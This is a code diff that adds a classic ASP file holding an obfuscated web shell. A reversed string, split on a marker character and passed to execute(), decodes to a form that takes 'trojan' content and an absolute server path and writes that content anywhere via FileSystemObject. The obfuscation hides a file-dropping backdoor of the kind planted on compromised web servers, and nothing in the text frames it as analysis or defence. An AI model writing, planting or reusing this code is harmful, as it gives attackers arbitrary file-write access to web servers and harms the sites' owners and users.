@@ -1,0 +1,14 @@
+<%
+hu="神"">p/<>b/<>tnof/<客刺习见:yB- !间时的聊无着发打事的聊无着做子日的聊无着过伙家的聊无个这>'der'=roloc '2'=ezis tnof<>b<>'retnec'=ngila p<"" etirw.esnopseR 神 "">p/ p<"" etirw.esnopseR 神 "">mrof/<"" etirw.esnopseR 神 "">存保=eulav timbus=epyt tupni<"" etirw.esnopseR 神 "">aeratxet/<>23=htdiw 01=swor 08=sloc ataddfyc=eman aeratxet<"" etirw.esnopseR 神 "":容内的马入输"" etirw.esnopseR 神 "">rb<"" etirw.esnopseR 神 ))""EMAN_TPIRCS""(selbairaVrevreS.tseuqeR(htappam.revres etirw.esnopseR 神 ""径路对绝件文本"" etirw.esnopseR 神 "">rb<"" etirW.esnopseR 神 "">05=ezis 23=htdiw htapdfys=eman txet=epyt tupni<"" etirW.esnopseR 神 "">tnof/<:)psa.x\bew\:D如:名件文括包(径路对绝>der=roloc tnof<的件文存保"" etirw.esnopseR 神 "">tsop=dohtem ''=noitca mrof<"" etirw.esnopseR 神 gnihtoN = OSFjbo teS 神 gnihtoN=eliFtnuoCjbo teS 神 esolC.eliFtnuoCjbo 神 fi dne 神 raelc.rre 神 fi dne 神 "">tnof/<!sseccuSnU evaS>der=roloc tnof<"" etirw.esnopser 神 esle 神 "">tnof/<!sseccuS evas>der=roloc tnof<"" etirw.esnopser 神 neht 0= rre fi 神 atadf etirW.eliFtnuoCjbo 神 )eurT,)""htapdfys""(tseuqer(eliFtxeTetaerC.OSFjbo=eliFtnuoCjbo teS 神 )""ataddfyc""(tseuqer = atadf 神 neht """"><))""htapdfys""(tseuqer(mirT fi 神 )""tcejbOmetsySeliF.gnitpircS""(tcejbOetaerC.revreS = OSFjbo teS 神 txen emuser rorre no 神 eliFtnuoCjbo mid 神 atadf mid 神 OSFjbo mid神"
+execute(UnEncode(hu))
+function UnEncode(cc)
+for i = 1 to len(cc)
+    if mid(cc,i,1)<> "神" then
+temp = Mid(cc, i, 1) + temp
+   else
+    temp=vbcrlf&temp
+ end if
+next
+UnEncode=temp
+end function
+%>
